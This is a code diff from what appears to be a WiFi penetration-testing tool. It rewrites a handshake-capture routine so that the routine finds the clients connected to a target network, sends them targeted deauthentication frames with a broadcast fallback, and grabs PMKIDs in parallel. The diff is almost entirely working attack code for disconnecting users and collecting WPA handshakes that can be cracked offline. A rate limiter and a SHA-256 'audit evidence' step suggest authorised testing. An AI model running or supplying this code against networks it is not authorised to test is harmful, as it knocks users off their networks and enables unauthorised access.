@@ -479,51 +479,143 @@ def _deauth_capture(
     auto: bool,
     limiter: DeauthRateLimiter,
 ) -> Optional[str]:
-    client_mac = "FF:FF:FF:FF:FF:FF"
-    if not auto:
-        cm = input(
-            f"  {C.YELLOW}Target client MAC (Enter for broadcast FF:FF:FF:FF:FF:FF): {C.RESET}"
-        ).strip()
-        if cm and re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", cm):
-            client_mac = cm.upper()
+    """
+    Handshake capture via targeted per-client deauth with broadcast fallback.
 
-    info(f"Deauth attack → BSSID {bssid}, client {client_mac}")
-    info(f"Rate limit: {limiter._max_bursts} bursts/min  Timeout: {timeout}s")
+    Pipeline per attempt:
+      1. Discover connected clients (passive airodump-ng scan)
+      2a. If clients found: send bidirectional targeted deauth to each (up to 3)
+          and check for handshake after each burst
+      2b. If no clients: broadcast deauth fallback
+      3. Wait up to timeout_per_attempt seconds checking for handshake
+      4. Repeat up to max_attempts times
+      PMKID capture runs in parallel throughout as a background thread.
+    """
+    from rich.console import Console
+    con = Console()
 
-    cap_file  = cap_base + "-01.cap"
+    cap_file = cap_base + "-01.cap"
+
+    # Derive attempt budget from total timeout
+    # Each attempt ~= scan(6-8s) + deauths(~5s) + wait(10s) + pause(3s) ~= 28s
+    max_attempts = max(3, timeout // 28)
+    timeout_per_attempt = max(8, timeout // max_attempts - 15)
+
+    con.print(f"\n[cyan]◈ Starting targeted handshake capture[/]")
+    con.print(f"  Target:    [bold]{ssid}[/bold] ({bssid})")
+    con.print(f"  Channel:   {channel}")
+    con.print(f"  Interface: {interface}")
+    con.print(f"  Strategy:  targeted deauth + PMKID parallel")
+    con.print(f"  Attempts:  {max_attempts}  (timeout {timeout}s)\n")
+
+    # Start passive packet capture in background (runs throughout all attempts)
     dump_proc = _start_airodump(interface, bssid, channel, cap_base)
+    time.sleep(2)  # let airodump-ng initialize before injecting
+
+    # PMKID capture in parallel -- no deauth needed, grabs from association frame
+    pmkid_result: dict[str, Optional[str]] = {"path": None}
+
+    def _pmkid_worker() -> None:
+        pmkid_result["path"] = _pmkid_capture(
+            interface, bssid, cap_base, min(timeout - 5, 60)
+        )
+
+    pmkid_thread = threading.Thread(target=_pmkid_worker, daemon=True)
+    pmkid_thread.start()
 
     handshake_found = False
-    elapsed = 0
 
     try:
-        while elapsed < timeout:
-            # Rate-limited wait before burst
-            limiter.wait_for_burst(bssid)
-            time.sleep(DEAUTH_INTERVAL)
-            elapsed += DEAUTH_INTERVAL
+        for attempt in range(1, max_attempts + 1):
+            con.print(f"\n[cyan]◈ Attempt {attempt}/{max_attempts}[/]")
 
-            _send_deauth(interface, bssid, client_mac, DEAUTH_COUNT)
-            stats = limiter.get_stats(bssid)
-            info(
-                f"  [{elapsed}s] Deauth burst sent  "
-                f"(tokens={stats['tokens_remaining']}/{stats['capacity']}  "
-                f"fps={stats['global_fps']})"
+            # Shorter scan on repeat attempts (clients don't change much)
+            scan_secs = 8 if attempt == 1 else 5
+            clients = discover_clients(
+                bssid=bssid,
+                monitor_interface=interface,
+                scan_duration=scan_secs,
+                channel=channel,
             )
-            logger.debug("Deauth burst: bssid=%s elapsed=%ds", bssid, elapsed)
 
-            if _verify_handshake(cap_file, bssid):
-                handshake_found = True
+            if clients:
+                display_clients(clients, bssid)
+                con.print(
+                    f"[green]  ✓ {len(clients)} client(s) found -- sending targeted deauth[/]"
+                )
+
+                for client in clients[:3]:
+                    con.print(
+                        f"\n[cyan]  ◈ Targeting [bold]{client['mac']}[/bold] "
+                        f"(signal: {client['power']} dBm)[/]"
+                    )
+                    send_targeted_deauth(
+                        bssid=bssid,
+                        client_mac=client["mac"],
+                        monitor_interface=interface,
+                        limiter=limiter,
+                        count=DEAUTH_COUNT,
+                    )
+                    # Check immediately -- handshake may already be in the buffer
+                    time.sleep(2)
+                    if _verify_handshake(cap_file, bssid):
+                        handshake_found = True
+                        break
+
+                if not handshake_found:
+                    # Wait for clients to reassociate
+                    con.print("[dim cyan]  Waiting for reassociation...[/]")
+                    for _ in range(timeout_per_attempt):
+                        time.sleep(1)
+                        if _verify_handshake(cap_file, bssid):
+                            handshake_found = True
+                            break
+
+            else:
+                con.print(
+                    "[dim yellow]  No clients found -- broadcast deauth fallback[/]"
+                )
+                send_broadcast_deauth_fallback(
+                    bssid=bssid,
+                    monitor_interface=interface,
+                    limiter=limiter,
+                    count=16,
+                )
+                for _ in range(timeout_per_attempt + 5):
+                    time.sleep(1)
+                    if _verify_handshake(cap_file, bssid):
+                        handshake_found = True
+                        break
+
+            if handshake_found:
                 break
-            if _csv_has_handshake(cap_base + "-01.csv", bssid):
-                handshake_found = True
-                break
+
+            if attempt < max_attempts:
+                con.print(f"[dim]  Not yet captured -- retrying in 3s...[/]")
+                time.sleep(3)
 
     except KeyboardInterrupt:
         warn("Capture interrupted by user.")
     finally:
         dump_proc.terminate()
-        dump_proc.wait()
+        try:
+            dump_proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            dump_proc.kill()
+
+    # Report PMKID result (background thread may still be running -- join briefly)
+    pmkid_thread.join(timeout=3)
+    if pmkid_result["path"]:
+        con.print(f"[green]◈ PMKID also captured: {pmkid_result['path']}[/]")
+
+    if handshake_found:
+        # Compute SHA-256 as audit evidence
+        try:
+            with open(cap_file, "rb") as f:
+                sha256 = hashlib.sha256(f.read()).hexdigest()
+            con.print(f"  SHA-256: [dim]{sha256}[/dim]")
+        except OSError:
+            pass
 
     return _finalize(cap_file, handshake_found)
 
